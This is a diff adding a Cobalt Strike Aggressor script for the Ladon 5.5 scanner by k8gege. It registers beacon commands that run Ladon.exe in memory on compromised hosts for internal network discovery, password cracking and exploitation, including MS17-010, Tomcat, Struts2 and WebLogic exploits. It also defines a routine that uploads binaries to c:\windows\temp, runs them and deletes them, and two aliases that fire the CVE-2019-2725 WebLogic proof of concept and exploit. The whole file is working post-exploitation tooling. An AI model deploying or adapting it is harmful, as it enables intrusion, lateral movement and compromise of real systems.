@@ -1,0 +1,73 @@
+#Cobalt Strike 3.x
+#Ladon 5.5 
+#author: k8gege
+#update: 20191109
+#Not Support [SmbScan MysqlScan OracleScan SSHscan]
+
+alias Ladon {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq "help"){
+	blog2($1, "Usage:");
+	#blog2($1, "Ladon 1");
+	blog2($1, "Ladon ip");
+	blog2($1, "Ladon ip scantype");
+	#blog2($1, "Ladon nocheck");
+	blog2($1, "Ladon nocheck ip");
+	blog2($1, "Ladon nocheck ip scantype");	
+	blog2($1, "ScanType:(Discover/Crack/Encode/Exploit)");
+	blog2($1, "ip: [ip ip/24 ip/26 ip/8]");
+	blog2($1, "scantype: [OnlineIP OnlinePC OSscan CiscoScan]");
+	blog2($1, "scantype: [WebScan WebScan2 SameWeb UrlScan WhatCMS WebDir SubDomain HostIP DomainIP]");
+	blog2($1, "scantype: [MS17010 WeblogicPoc WeblogicExp PhpStudyPoc ActiveMQPoc TomcatPoc TomcatExp Struts2Poc]");
+	blog2($1, "scantype: [FtpScan WmiScan IpLadon MssqlScan VncScan RarScan]");
+	blog2($1, "scantype: [EnumMSSQL EnumShare]");
+	blog2($1, "scantype: [EnHex DeHex EnBase64 DeBase64]");
+	blog2($1, "Example: Ladon 192.168.1.8/24 OnlinePC");	
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.ini");	
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.ps1");
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.dll(c#)");
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.exe(c#)");	
+	return;}else
+	{bexecute_assembly!($1, script_resource("Ladon.exe"), $2.' '.$3.' '.$4.' '.$5);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub LadonStart {
+	blog2($bid,"Ladon ".$3["moudle"]);
+	bcd!($bid, "c:\\windows\\temp");
+	brm!($bid,"Ladon.exe");
+	brm!($bid,"netscan.dll");
+	#bshell!($bid,"del Ladon**.exe");
+	if($3["moudle"] !eq "Default"){
+		brm!($bid, "netscan.dll");
+	}	
+	bupload!($bid, script_resource("bin\\Ladon".$3['clrver'].".exe"));
+	bmv!($bid, "Ladon".$3['clrver'].".exe", "Ladon.exe");
+	if($3["moudle"] !eq "Default"){
+		bupload!($bid, script_resource("bin\\".$3['moudle']."\\netscan".$3['clrver'].".dll"));
+		bmv!($bid, "netscan".$3['clrver'].".dll", "netscan.dll");
+	}
+
+	bshell!($bid, "Ladon.exe");
+	#bpause($1, 10000);
+	brm!($bid,"Ladon.exe");
+	if($3["moudle"] !eq "Default"){
+		brm!($bid, "netscan.dll");
+	}
+}
+
+alias CVE-2019-2725-POC {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq ""){
+	return;}else
+	{bexecute_assembly!($1, script_resource("Ladon.exe"), $2.' WeblogicPoc');}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+alias CVE-2019-2725-EXP {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq ""){
+	return;}else
+	{bexecute_assembly!($1, script_resource("Ladon.exe"), $2.' WeblogicExp');}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
